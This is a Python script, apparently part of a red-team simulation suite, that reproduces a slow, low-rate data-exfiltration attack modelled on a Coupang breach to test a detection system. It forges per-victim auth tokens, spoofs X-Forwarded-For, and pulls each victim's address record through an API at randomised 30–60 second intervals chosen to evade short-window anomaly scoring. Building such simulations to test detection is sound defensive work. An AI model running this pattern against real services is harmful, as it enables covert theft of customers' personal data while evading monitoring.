"""
S6 — Slow & Low (쿠팡 7개월 미탐지 재현).

행위:
- 단일 IP에서 분당 1~2건 페이스로 sleep (--min/max-interval 30~60s)
- sub는 [START, END) 범위에서 `VICTIM_COUNT`명 랜덤 비복원 추출 → 순차 패턴 숨김
- 최대 24시간 가동 (--duration). 풀(`VICTIM_COUNT`명) 소진 또는 duration 도달 시 종료
  (VICTIM_COUNT=100이면 분당 1~2건 × 60 × 1~2h ≈ 1~2시간이면 풀 소진)

기대 탐지:
- 첫 1시간: 5분 윈도우 미달, 모든 신호 0점
- t=01:00: 1시간 윈도우 의심 단계 (70)
- t=24:00: 24시간 윈도우 override 100 + 누적유출량 z-score 폭증
- MTTD 목표: 수 시간 ~ 24h (장기 윈도우 검증 시 VICTIM_COUNT 충분히 크게 설정 권장)
"""
import os
import sys
import time
import random
import argparse
from pathlib import Path

from dotenv import load_dotenv

_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_ROOT))

from lib.token_forge import forge_token
from lib.target_pool import get_shuffled_pool
from lib.http_client import get_session, call_api
from lib.result_writer import ResultWriter

load_dotenv(_ROOT / ".env")


def run_s6(
    duration_hours: float = 24.0,
    min_interval: float = 30.0,
    max_interval: float = 60.0,
):
    """
    Parameters
    ----------
    duration_hours : 공격 지속 시간 (시간 단위, 발표용 6h 압축 가능)
    min_interval : 요청 간 최소 간격 (초)
    max_interval : 요청 간 최대 간격 (초)
    """
    session = get_session()
    pool = get_shuffled_pool()
    pool_idx = 0

    # XFF 위조용 source IP (S4와 다른 IP로 두면 동시 시연 시 분리 집계됨)
    src_ip = os.environ.get("S6_SOURCE_IP")

    start_time = time.time()
    end_time = start_time + duration_hours * 3600
    writer = ResultWriter("S6")

    print(
        f"[S6] 시작 — duration={duration_hours}h, "
        f"interval={min_interval}~{max_interval}s"
    )
    print(f"[S6] target pool: {len(pool)}명 (shuffled)")
    print(f"[S6] X-Forwarded-For: {src_ip or '(미위조)'}")

    try:
        while time.time() < end_time:
            if pool_idx >= len(pool):
                print(f"[S6] pool 소진 ({pool_idx}명) — 종료")
                break

            victim_id = pool[pool_idx]
            token = forge_token(victim_id)
            path = f"/api/addresses/{victim_id}"

            try:
                resp = call_api(session, path, token, src_ip=src_ip)
                writer.record(victim_id, src_ip, "GET", path, resp)
            except Exception as e:
                writer.record_error(victim_id, src_ip, path, e)

            pool_idx += 1
            # 분당 1~2건 — 5분 윈도우 z-score 미달 페이스
            time.sleep(random.uniform(min_interval, max_interval))
    except KeyboardInterrupt:
        print(f"\n[S6] 사용자 중단")
    finally:
        writer.close()

    print(f"[S6] 종료 — {pool_idx}명 점진 유출")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--duration", type=float, default=24.0, help="공격 지속 시간 (시간)")
    parser.add_argument("--min-interval", type=float, default=30.0, help="요청 간 최소 간격 (초)")
    parser.add_argument("--max-interval", type=float, default=60.0, help="요청 간 최대 간격 (초)")
    args = parser.parse_args()
    run_s6(args.duration, args.min_interval, args.max_interval)
